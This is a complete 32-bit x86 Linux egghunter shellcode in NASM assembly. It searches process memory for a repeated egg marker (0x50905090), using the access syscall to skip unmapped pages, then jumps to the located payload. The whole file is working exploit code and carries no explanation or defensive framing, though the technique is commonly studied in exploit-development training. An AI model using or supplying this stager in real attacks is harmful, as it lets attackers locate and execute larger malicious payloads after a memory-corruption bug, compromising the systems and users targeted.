BITS 32

; initialization
mov ebx,0x50905090
xor ecx,ecx
mul ecx

next_page:
or dx,0xfff

increase_pointer:
inc edx

pusha
; system call
mov al,0x21
lea ebx,[edx+0x4]
int 0x80
; EFAULT?
cmp al,0xf2
popa
; then proceed to next page
jz next_page
; if not, compare to egg
cmp ebx,[edx]
jnz increase_pointer
cmp ebx,[edx+0x4]
jnz increase_pointer
jmp edx

